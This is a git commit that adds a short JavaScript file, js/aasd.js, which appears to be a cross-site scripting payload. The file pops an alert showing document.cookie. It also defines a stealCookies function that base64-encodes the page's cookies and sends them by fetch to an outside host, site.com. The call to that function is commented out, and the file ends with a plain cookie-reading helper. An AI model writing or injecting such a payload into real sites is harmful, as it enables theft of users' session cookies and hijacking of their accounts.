ca2f033718b393ec402b378876292e401e254b12
RhyRu9 <164749781+RHYru9@users.noreply.github.com>
2024-12-13 05:13:02 +0700

    Create aasd.js

---
+++ js/aasd.js
@@ -0,0 +1,19 @@
+
+alert(document.cookie);
+function stealCookies(){
+  const url = 'https://site.com/?cookies=' + btoa(document.cookie)
+  const response = fetch(url)
+}
+
+function getCookie(cname)
+{
+  var name = cname + "=";
+  var ca = document.cookie.split(';');
+  for(var i=0; i<ca.length; i++) 
+  {
+    var c = ca[i].trim();
+    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
+  }
+  return "";
+}
+//stealCookies();
